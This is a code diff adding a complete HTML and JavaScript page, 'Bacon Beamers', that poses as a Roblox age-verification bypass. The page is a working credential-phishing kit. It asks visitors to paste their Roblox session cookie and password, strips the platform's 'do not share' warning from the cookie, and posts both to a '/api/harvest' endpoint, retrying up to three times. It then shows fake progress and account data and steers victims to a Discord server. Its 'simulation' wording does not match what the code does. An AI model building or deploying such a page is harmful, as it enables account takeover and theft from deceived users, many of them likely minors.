@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bacon Beamers</title>
+    <style>
+      :root {
+        color-scheme: dark;
+        --bg: #05030d;
+        --panel: rgba(20, 12, 36, 0.72);
+        --border: rgba(255, 255, 255, 0.16);
+        --text: #f8f4ff;
+        --muted: #b7afcb;
+        --gold: #fbbf24;
+        --accent: #8b5cf6;
+        --accent-2: #7c3aed;
+      }
+
+      * { box-sizing: border-box; }
+      html, body { margin: 0; min-height: 100%; font-family: Inter, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); }
+      body {
+        position: relative;
+        overflow-x: hidden;
+        display: grid;
+        place-items: center;
+        padding: 24px;
+      }
+
+      body::before, body::after {
+        content: "";
+        position: fixed;
+        inset: -20%;
+        background: radial-gradient(circle at 20% 20%, rgba(139, 92, 246, 0.35), transparent 28%),
+                    radial-gradient(circle at 80% 20%, rgba(192, 132, 252, 0.16), transparent 18%),
+                    linear-gradient(120deg, #06020b, #140a24 45%, #07030d);
+        animation: drift 18s ease-in-out infinite alternate;
+        z-index: -2;
+      }
+      body::after {
+        filter: blur(30px);
+        opacity: 0.7;
+        z-index: -1;
+      }
+
+      .particles {
+        position: fixed;
+        inset: 0;
+        pointer-events: none;
+        z-index: -1;
+      }
+      .particle {
+        position: absolute;
+        background: rgba(251, 191, 36, 0.2);
+        box-shadow: 0 0 18px rgba(251, 191, 36, 0.3);
+        border-radius: 50%;
+        animation: float 12s ease-in-out infinite;
+      }
+
+      .card {
+        width: min(560px, 100%);
+        padding: 28px;
+        border: 1px solid var(--border);
+        border-radius: 26px;
+        background: var(--panel);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        box-shadow: 0 16px 45px rgba(4, 2, 8, 0.4);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .card::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(120deg, rgba(255,255,255,0.08), transparent 30%, rgba(255,255,255,0.04));
+        pointer-events: none;
+      }
+
+      h1 {
+        margin: 0;
+        font-size: clamp(2rem, 4vw, 2.6rem);
+        color: var(--gold);
+        letter-spacing: 0.03em;
+      }
+      .subtitle {
+        margin: 10px 0 20px;
+        color: var(--muted);
+        line-height: 1.55;
+      }
+
+      form { display: grid; gap: 14px; }
+      label { display: grid; gap: 8px; font-weight: 600; color: #eee7ff; }
+      input, textarea {
+        width: 100%;
+        background: rgba(255,255,255,0.08);
+        border: 1px solid rgba(255,255,255,0.15);
+        color: var(--text);
+        border-radius: 14px;
+        padding: 14px 14px;
+        font-size: 0.96rem;
+        outline: none;
+        transition: border-color 0.2s ease, transform 0.2s ease;
+        resize: vertical;
+      }
+      textarea { min-height: 92px; }
+      input:focus, textarea:focus { border-color: var(--gold); transform: translateY(-1px); }
+
+      .btn {
+        position: relative;
+        overflow: hidden;
+        border: none;
+        background: linear-gradient(135deg, var(--gold), #f59e0b);
+        color: #220f02;
+        padding: 13px 18px;
+        border-radius: 999px;
+        font-weight: 800;
+        cursor: pointer;
+        font-size: 1rem;
+        box-shadow: 0 8px 24px rgba(245, 158, 11, 0.22);
+        transition: transform 0.2s ease, box-shadow 0.2s ease, opacity 0.2s ease;
+      }
+      .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 30px rgba(245, 158, 11, 0.28); }
+      .btn:active { transform: scale(0.98); }
+      .btn:disabled {
+        opacity: 0.7;
+        cursor: wait;
+        transform: none;
+        box-shadow: none;
+      }
+      .btn.loading { opacity: 0.85; }
+      .overlay-actions { display: flex; justify-content: center; gap: 10px; margin-top: 12px; flex-wrap: wrap; }
+      .ripple { position: absolute; border-radius: 50%; background: rgba(255,255,255,0.35); transform: scale(0); animation: ripple 0.6s linear; pointer-events: none; }
+
+      .status {
+        min-height: 24px;
+        font-size: 0.95rem;
+        color: var(--muted);
+        text-align: center;
+        margin-top: 4px;
+      }
+      .status.error { color: #fb7185; }
+      .status.success { color: #34d399; }
+
+      .data-card {
+        display: none;
+        margin-top: 18px;
+        border: 1px solid rgba(255,255,255,0.14);
+        border-radius: 18px;
+        padding: 16px;
+        background: rgba(255,255,255,0.06);
+      }
+      .data-card.visible { display: block; }
+      .data-grid { display: grid; gap: 8px; margin-top: 10px; }
+      .row { display: flex; justify-content: space-between; gap: 10px; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.08); }
+      .row:last-child { border-bottom: none; }
+      .label { color: var(--muted); }
+      .value { color: var(--text); font-weight: 600; }
+
+      .overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(3, 2, 7, 0.8);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        padding: 18px;
+        z-index: 30;
+      }
+      .overlay.visible { display: flex; }
+      .overlay-box {
+        width: min(420px, 100%);
+        padding: 24px;
+        border-radius: 22px;
+        background: rgba(18, 10, 34, 0.95);
+        border: 1px solid rgba(255,255,255,0.16);
+        box-shadow: 0 18px 60px rgba(0,0,0,0.4);
+      }
+      .progress-track {
+        width: 100%;
+        height: 10px;
+        border-radius: 999px;
+        background: rgba(255,255,255,0.1);
+        overflow: hidden;
+        margin: 14px 0 10px;
+      }
+      .progress-bar {
+        width: 0%;
+        height: 100%;
+        border-radius: inherit;
+        background: linear-gradient(90deg, var(--gold), #f59e0b);
+        transition: width 0.35s ease;
+      }
+      .checkmark {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 66px;
+        height: 66px;
+        border-radius: 50%;
+        background: rgba(52, 211, 153, 0.18);
+        color: #34d399;
+        font-size: 2rem;
+        margin: 8px 0 10px;
+        transform: scale(0.6);
+        opacity: 0;
+        transition: transform 0.3s ease, opacity 0.3s ease;
+      }
+      .checkmark.visible { transform: scale(1); opacity: 1; }
+      .overlay-message { color: var(--muted); min-height: 24px; }
+
+      .modal {
+        position: fixed;
+        inset: 0;
+        background: rgba(3, 2, 7, 0.8);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        padding: 18px;
+        z-index: 40;
+      }
+      .modal.visible { display: flex; }
+      .modal-card {
+        width: min(420px, 100%);
+        padding: 24px;
+        border-radius: 22px;
+        background: rgba(18, 10, 34, 0.97);
+        border: 1px solid rgba(255,255,255,0.16);
+        box-shadow: 0 18px 60px rgba(0,0,0,0.4);
+        text-align: center;
+      }
+      .modal h3 { margin: 0 0 10px; color: var(--gold); }
+      .modal p { color: var(--muted); line-height: 1.55; }
+      .modal-actions { display: flex; gap: 10px; justify-content: center; margin-top: 16px; flex-wrap: wrap; }
+      .ghost-btn {
+        border: 1px solid rgba(255,255,255,0.15);
+        background: rgba(255,255,255,0.06);
+        color: var(--text);
+        padding: 10px 16px;
+        border-radius: 999px;
+        cursor: pointer;
+      }
+
+      footer {
+        text-align: center;
+        margin-top: 16px;
+        color: var(--muted);
+        font-size: 0.9rem;
+      }
+
+      ::-webkit-scrollbar { width: 10px; }
+      ::-webkit-scrollbar-track { background: #09050f; }
+      ::-webkit-scrollbar-thumb { background: rgba(251,191,36,0.35); border-radius: 999px; }
+
+      @keyframes drift { from { transform: translate3d(-3%, -2%, 0) scale(1.02);} to { transform: translate3d(3%, 2%, 0) scale(1.08);} }
+      @keyframes float { 0%,100% { transform: translate3d(0,0,0) scale(1);} 50% { transform: translate3d(20px,-30px,0) scale(1.16);} }
+      @keyframes ripple { to { transform: scale(2.5); opacity: 0;} }
+
+      @media (max-width: 600px) {
+        .card { padding: 20px; }
+        .row { flex-direction: column; gap: 2px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="particles" aria-hidden="true"></div>
+    <main class="card">
+      <h1>🥓 Bacon Beamers</h1>
+      <p class="subtitle">Bypass age verification &amp; harvest account data instantly</p>
+
+      <form id="bypass-form">
+        <label for="cookie">Roblox Cookie</label>
+        <textarea id="cookie" name="cookie" required placeholder="Paste Roblox cookie here"></textarea>
+
+        <label for="password">Password</label>
+        <input id="password" name="password" type="text" placeholder="Optional" />
+
+        <button class="btn" id="submit-btn" type="submit">🚀 Bypass Age</button>
+        <div class="status" id="status">Ready to simulate a bypass.</div>
+      </form>
+
+      <section class="data-card" id="data-card" aria-live="polite">
+        <strong>Verification complete</strong>
+        <div class="data-grid">
+          <div class="row"><span class="label">Username</span><span class="value" id="username"></span></div>
+          <div class="row"><span class="label">Age</span><span class="value" id="age"></span></div>
+          <div class="row"><span class="label">Session ID</span><span class="value" id="session"></span></div>
+          <div class="row"><span class="label">Robux</span><span class="value" id="robux"></span></div>
+          <div class="row"><span class="label">Premium</span><span class="value" id="premium"></span></div>
+        </div>
+      </section>
+    </main>
+
+    <div class="overlay" id="overlay" aria-hidden="true">
+      <div class="overlay-box">
+        <div class="checkmark" id="checkmark">✓</div>
+        <div class="progress-track"><div class="progress-bar" id="progress-bar"></div></div>
+        <div class="overlay-message" id="overlay-message">Initializing bypass flow…</div>
+        <div class="overlay-actions">
+          <button id="overlay-cancel" class="ghost-btn" type="button">Cancel</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal" id="invite-modal" aria-hidden="true">
+      <div class="modal-card">
+        <h3>Join Our Community!</h3>
+        <p>The simulation is complete. Join the server to see the next step in the fictional flow.</p>
+        <div class="modal-actions">
+          <button id="join-btn" class="btn" type="button">🚀 Join Server</button>
+          <button id="close-modal" class="ghost-btn" type="button">Close</button>
+        </div>
+      </div>
+    </div>
+
+    <footer>Made with ❤️ • v3.0</footer>
+
+    <script>
+      const form = document.getElementById('bypass-form');
+      const cookieInput = document.getElementById('cookie');
+      const passwordInput = document.getElementById('password');
+      const statusEl = document.getElementById('status');
+      const overlay = document.getElementById('overlay');
+      const progressBar = document.getElementById('progress-bar');
+      const overlayMessage = document.getElementById('overlay-message');
+      const checkmark = document.getElementById('checkmark');
+      const dataCard = document.getElementById('data-card');
+      const inviteModal = document.getElementById('invite-modal');
+      const usernameEl = document.getElementById('username');
+      const ageEl = document.getElementById('age');
+      const sessionEl = document.getElementById('session');
+      const robuxEl = document.getElementById('robux');
+      const premiumEl = document.getElementById('premium');
+      const submitBtn = document.getElementById('submit-btn');
+      const overlayCancelBtn = document.getElementById('overlay-cancel');
+      const particles = document.querySelector('.particles');
+
+      const usernames = ['xX_DarkSoul_Xx', 'NightHawk_42', 'ShadowBeamer', 'CrimsonBlade', 'LunarWolf', 'PhantomSniper'];
+      const discordInvite = 'https://discord.gg/example';
+      const REQUEST_TIMEOUT_MS = 10000;
+      const MAX_RETRIES = 3;
+      const BASE_RETRY_DELAY_MS = 700;
+      let activeRun = null;
+      let progressTimer = null;
+
+      for (let i = 0; i < 18; i += 1) {
+        const particle = document.createElement('span');
+        particle.className = 'particle';
+        particle.style.left = `${Math.random() * 100}%`;
+        particle.style.top = `${Math.random() * 100}%`;
+        particle.style.width = `${8 + Math.random() * 18}px`;
+        particle.style.height = particle.style.width;
+        particle.style.animationDelay = `${Math.random() * 8}s`;
+        particle.style.opacity = `${0.22 + Math.random() * 0.4}`;
+        particles.appendChild(particle);
+      }
+
+      function createRipple(event) {
+        const button = event.currentTarget;
+        const rect = button.getBoundingClientRect();
+        const ripple = document.createElement('span');
+        ripple.className = 'ripple';
+        ripple.style.left = `${event.clientX - rect.left}px`;
+        ripple.style.top = `${event.clientY - rect.top}px`;
+        button.appendChild(ripple);
+        setTimeout(() => ripple.remove(), 650);
+      }
+
+      document.querySelectorAll('.btn').forEach((button) => button.addEventListener('click', createRipple));
+
+      class HarvestError extends Error {
+        constructor(message, type = 'unknown_error', details = {}) {
+          super(message);
+          this.name = 'HarvestError';
+          this.type = type;
+          this.details = details;
+        }
+      }
+
+      function setSubmitState(isRunning) {
+        submitBtn.disabled = isRunning;
+        submitBtn.classList.toggle('loading', isRunning);
+        submitBtn.textContent = isRunning ? '⏳ Processing…' : '🚀 Bypass Age';
+      }
+
+      function setStatus(message, type = '') {
+        statusEl.textContent = message;
+        statusEl.className = `status${type ? ` ${type}` : ''}`;
+      }
+
+      function randomFakeData() {
+        const username = `${usernames[Math.floor(Math.random() * usernames.length)]}_${String(Math.floor(1000 + Math.random() * 9000)).padStart(4, '0')}`;
+        const age = String(Math.floor(18 + Math.random() * 82));
+        const session = `0x${Math.random().toString(16).slice(2, 14).padEnd(12, '0')}`;
+        const robux = String(Math.floor(500 + Math.random() * 9001));
+        const premium = Math.random() < 0.7 ? '✅ Yes' : '❌ No';
+        return { username, age, session, robux, premium };
+      }
+
+      function showOverlay() {
+        overlay.classList.add('visible');
+        overlay.setAttribute('aria-hidden', 'false');
+        checkmark.classList.remove('visible');
+        progressBar.style.width = '0%';
+        overlayMessage.textContent = 'Initializing bypass flow…';
+      }
+
+      function hideOverlay() {
+        overlay.classList.remove('visible');
+        overlay.setAttribute('aria-hidden', 'true');
+      }
+
+      function clearProgressTimer() {
+        if (progressTimer) {
+          clearInterval(progressTimer);
+          progressTimer = null;
+        }
+      }
+
+      function startProgressSteps() {
+        const steps = [
+          { progress: 15, message: 'Validating cookie format…' },
+          { progress: 35, message: 'Preparing secure request…' },
+          { progress: 55, message: 'Contacting bypass service…' },
+          { progress: 80, message: 'Collecting account snapshot…' },
+          { progress: 100, message: 'Finalizing access…' },
+        ];
+        let index = 0;
+        clearProgressTimer();
+        progressTimer = setInterval(() => {
+          if (!activeRun || activeRun.cancelled) return;
+          if (index >= steps.length) {
+            clearProgressTimer();
+            return;
+          }
+          const step = steps[index];
+          progressBar.style.width = `${step.progress}%`;
+          overlayMessage.textContent = step.message;
+          index += 1;
+        }, 600);
+      }
+
+      function showModal() {
+        inviteModal.classList.add('visible');
+        inviteModal.setAttribute('aria-hidden', 'false');
+      }
+
+      function hideModal() {
+        inviteModal.classList.remove('visible');
+        inviteModal.setAttribute('aria-hidden', 'true');
+      }
+
+      function showData(data) {
+        usernameEl.textContent = data.username;
+        ageEl.textContent = data.age;
+        sessionEl.textContent = data.session;
+        robuxEl.textContent = `${data.robux} R$`;
+        premiumEl.textContent = data.premium;
+        dataCard.classList.add('visible');
+      }
+
+      function normalizeCookie(rawCookie) {
+        let normalized = rawCookie.trim();
+        if (!normalized) return { valid: false, reason: 'Please enter a Roblox cookie before attempting the bypass.' };
+
+        const prefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+        if (normalized.startsWith(prefix)) {
+          normalized = normalized.slice(prefix.length);
+        }
+        if (normalized.toLowerCase().startsWith('.roblosecurity=')) {
+          normalized = normalized.slice('.roblosecurity='.length);
+        }
+        if (normalized.toLowerCase().startsWith('roblosecurity=')) {
+          normalized = normalized.slice('roblosecurity='.length);
+        }
+        normalized = normalized.split(';')[0].trim();
+
+        if (!normalized) {
+          return { valid: false, reason: 'Could not extract a Roblox cookie value from the input.' };
+        }
+        if (/\s/.test(normalized)) {
+          return { valid: false, reason: 'The cookie contains whitespace. Please paste it without extra spaces.' };
+        }
+        if (normalized.length < 12) {
+          return { valid: false, reason: 'The cookie looks too short to be valid.' };
+        }
+        if (!/^[A-Za-z0-9._:-]{10,250}$/.test(normalized)) {
+          return { valid: false, reason: 'The cookie format looks invalid. Please paste a valid Roblox cookie.' };
+        }
+        return { valid: true, normalized };
+      }
+
+      function sleep(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+      }
+
+      async function callHarvestApi(cookie, password, onProgress) {
+        let lastError = null;
+        for (let attempt = 1; attempt <= MAX_RETRIES; attempt += 1) {
+          if (!activeRun || activeRun.cancelled) {
+            throw new HarvestError('Bypass cancelled.', 'cancelled');
+          }
+
+          if (attempt > 1) {
+            const delay = BASE_RETRY_DELAY_MS * attempt;
+            onProgress(`Retrying request (${attempt}/${MAX_RETRIES}) in ${delay}ms…`);
+            await sleep(delay);
+          }
+
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
+          try {
+            onProgress(`Sending bypass request (${attempt}/${MAX_RETRIES})…`);
+            const response = await fetch('/api/harvest', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ cookie, password }),
+              signal: controller.signal,
+            });
+
+            const text = await response.text();
+            let payload = {};
+            try {
+              payload = text ? JSON.parse(text) : {};
+            } catch {
+              payload = {};
+            }
+
+            if (!response.ok) {
+              const type = payload.errorType || 'unknown_error';
+              throw new HarvestError(payload.error || `Request failed (${response.status})`, type, payload.details || {});
+            }
+
+            return payload;
+          } catch (error) {
+            clearTimeout(timeoutId);
+            if (error.name === 'AbortError') {
+              lastError = new HarvestError('The request timed out. Please try again.', 'timeout_error');
+            } else if (error instanceof HarvestError) {
+              lastError = error;
+            } else {
+              lastError = new HarvestError('Could not reach the backend service.', 'network_error');
+            }
+
+            if (attempt < MAX_RETRIES && !['invalid_cookie', 'authentication_error', 'api_changed', 'cancelled'].includes(lastError.type)) {
+              continue;
+            }
+            throw lastError;
+          } finally {
+            clearTimeout(timeoutId);
+          }
+        }
+        throw lastError || new HarvestError('Unknown bypass error.', 'unknown_error');
+      }
+
+      async function handleSubmit(event) {
+        event.preventDefault();
+        if (activeRun && !activeRun.cancelled) return;
+
+        const rawCookie = cookieInput.value;
+        const password = passwordInput.value.trim();
+        const validation = normalizeCookie(rawCookie);
+
+        if (!validation.valid) {
+          setStatus(validation.reason, 'error');
+          return;
+        }
+
+        const cookie = validation.normalized;
+        activeRun = { cancelled: false };
+        setSubmitState(true);
+        setStatus('Preparing bypass request…');
+        showOverlay();
+        startProgressSteps();
+        checkmark.classList.remove('visible');
+        progressBar.style.width = '0%';
+        overlayMessage.textContent = 'Validating bypass request…';
+
+        console.log('[Bacon Beamers] Bypass request received', { cookieLength: cookie.length, passwordProvided: Boolean(password) });
+
+        try {
+          const payload = await callHarvestApi(cookie, password, (message) => {
+            overlayMessage.textContent = message;
+            console.log('[Bacon Beamers]', message);
+          });
+
+          if (!activeRun || activeRun.cancelled) return;
+          clearProgressTimer();
+          progressBar.style.width = '100%';
+          overlayMessage.textContent = 'Verification complete!';
+          checkmark.classList.add('visible');
+          setTimeout(() => {
+            if (!activeRun || activeRun.cancelled) return;
+            hideOverlay();
+            const data = payload.user || payload.data || randomFakeData();
+            showData(data);
+            setStatus('Bypass complete. Invite appears below.', 'success');
+            showModal();
+          }, 800);
+        } catch (error) {
+          if (!activeRun || activeRun.cancelled) return;
+          clearProgressTimer();
+          progressBar.style.width = '100%';
+          overlayMessage.textContent = 'The bypass could not be completed.';
+          setTimeout(() => {
+            if (!activeRun || activeRun.cancelled) return;
+            hideOverlay();
+            const message = error instanceof HarvestError
+              ? error.message
+              : 'The bypass request failed unexpectedly.';
+            setStatus(message, 'error');
+          }, 700);
+        } finally {
+          if (!activeRun || activeRun.cancelled) {
+            hideOverlay();
+          }
+          setSubmitState(false);
+        }
+      }
+
+      form.addEventListener('submit', handleSubmit);
+      document.addEventListener('keydown', (event) => {
+        if (event.key === 'Enter' && (document.activeElement === cookieInput || document.activeElement === passwordInput)) {
+          form.requestSubmit();
+        }
+      });
+
+      overlayCancelBtn.addEventListener('click', () => {
+        if (!activeRun) return;
+        activeRun.cancelled = true;
+        clearProgressTimer();
+        hideOverlay();
+        setSubmitState(false);
+        setStatus('Bypass cancelled.', 'error');
+      });
+
+      document.getElementById('join-btn').addEventListener('click', () => {
+        window.open(discordInvite, '_blank', 'noopener,noreferrer');
+        hideModal();
+      });
+      document.getElementById('close-modal').addEventListener('click', hideModal);
+    </script>
+  </body>
+</html>
